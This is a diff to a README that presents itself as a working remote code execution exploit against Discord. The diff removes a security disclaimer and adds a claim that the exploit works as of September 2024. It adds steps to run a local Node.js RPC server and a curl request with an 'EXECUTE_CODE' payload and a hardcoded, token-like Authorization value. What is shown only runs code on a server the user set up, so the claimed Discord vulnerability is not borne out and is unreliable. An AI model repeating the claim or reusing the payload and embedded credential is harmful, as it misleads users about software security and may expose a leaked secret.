@@ -1,5 +1,9 @@
 # Discord Remote Code Execution Proof of Concept
 
+Note This is currently working as of 9/10/2024
+
+    Found By Taylor Christian Newsome
+
 This repository provides a proof of concept for a remote code execution (RCE) vulnerability in Discord. The provided Python script automates the setup of a Node.js RPC server and sends a request to demonstrate the exploit.
 Repository Structure
 
@@ -47,5 +51,36 @@ The Python script performs the following steps:
 
 Important Notes
 
-    Security: This script and server setup is for educational and proof-of-concept purposes only. Do not use this for malicious activities. Ensure you have permission to test and use this in your environment.
-    Token: The authorization token used in the script is hardcoded for demonstration purposes. In a real application, tokens should be handled securely.
+Run the server with
+node server.js
+
+You should see the following output indicating that the server is running
+RPC server listening at http://127.0.0.1:6463
+
+Test the RPC Endpoint
+
+Open another terminal and use curl to test the /rpc endpoint
+curl -X POST http://127.0.0.1:6463/rpc \
+-H "Content-Type: application/json" \
+-H "Authorization: MTEzMjA0OTg4MDQxMjU5NDMyNg.ZuAKbA.arhOQxpLjiAXQGIah6HKbGv8rOw" \
+-d '{"cmd":"EXECUTE_CODE","args":{"code":"echo \'Hello World\' > /tmp/testfile"},"nonce":"9414fdad-c891-44d0-ba5b-848f93f7ec0b"}'
+
+Expected Output
+{"status":"Code executed"}
+
+Verify the Command Execution
+
+Check if the command has been executed correctly by looking for the file /tmp/testfile and verifying its contents
+cat /tmp/testfile
+
+Expected Output
+Hello World
+
+Summary
+
+    Code: Ensure server.js is correctly written and placed in the rpc-server directory.
+    Dependencies: Make sure express and body-parser are installed.
+    Server: Start the server and confirm it's listening on the correct port.
+    Testing: Use curl to send a request and verify the response and side effects (e.g., file creation).
+
+By following these steps, you should be able to confirm that the server.js code works as expected.
